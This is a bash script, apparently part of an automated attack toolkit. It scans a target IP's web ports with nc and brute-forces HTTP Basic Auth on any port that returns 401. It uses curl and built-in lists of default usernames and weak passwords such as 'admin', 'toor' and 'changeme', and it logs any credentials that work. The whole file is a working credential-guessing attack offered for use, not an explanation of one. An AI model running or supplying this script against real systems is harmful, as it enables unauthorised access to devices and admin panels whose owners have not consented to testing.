#!/bin/bash
# HTTP Basic Auth bruteforce for common credentials
# Args: $1=IP  $2=MAC  $3=ATTACKER_IP
# Env:  KARMA_OUT

WAIT=2
HTTP_PORTS=(80 8080 8000 8888)
HTTPS_PORTS=(443 8443)
TIME="$(date +'%H:%M:%S_%d.%m.%Y')"
OUT="${KARMA_OUT:-$(dirname "$0")/..}"
mkdir -p "$OUT"
OUTFILE="$OUT/http_basic-${1}_${TIME}.txt"

USERS=(admin root guest administrator user support supervisor)
PASSWORDS=("" "admin" "password" "1234" "12345" "123456" "admin123"
           "root" "toor" "guest" "pass" "test" "default" "1111" "0000"
           "service" "changeme" "letmein" "welcome" "000000" "master")

function try_auth() {
	local scheme=$1 ip=$2 port=$3 user=$4 pass=$5
	code=$(curl -sk -o /dev/null -w "%{http_code}" \
		-u "${user}:${pass}" --max-time 5 \
		"${scheme}://${ip}:${port}/")
	case "$code" in
		200|301|302|303) return 0 ;;
	esac
	return 1
}

function brute() {
	local scheme=$1 ip=$2 port=$3

	# only attack if server responds with 401 (basic auth required)
	code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "${scheme}://${ip}:${port}/")
	[ "$code" != "401" ] && return

	echo "[*] HTTP Basic Auth on ${scheme}://${ip}:${port} — bruteforcing..."
	echo "[*] HTTP Basic Auth on ${scheme}://${ip}:${port}" >> "$OUTFILE"

	for user in "${USERS[@]}"; do
		for pass in "${PASSWORDS[@]}"; do
			if try_auth "$scheme" "$ip" "$port" "$user" "$pass"; then
				echo "[+] FOUND ${scheme}://${ip}:${port} → ${user}:${pass}"
				echo "[+] FOUND ${scheme}://${ip}:${port} -> ${user}:${pass}" >> "$OUTFILE"
				return 0
			fi
		done
	done
	echo "[-] no credentials found on ${scheme}://${ip}:${port}"
	echo "[-] no credentials found on ${scheme}://${ip}:${port}" >> "$OUTFILE"
}

for port in "${HTTP_PORTS[@]}"; do
	if nc -nw $WAIT "$1" "$port" </dev/null 2>/dev/null; then
		brute http "$1" "$port"
	fi
done

for port in "${HTTPS_PORTS[@]}"; do
	if nc -nw $WAIT "$1" "$port" </dev/null 2>/dev/null; then
		brute https "$1" "$port"
	fi
done
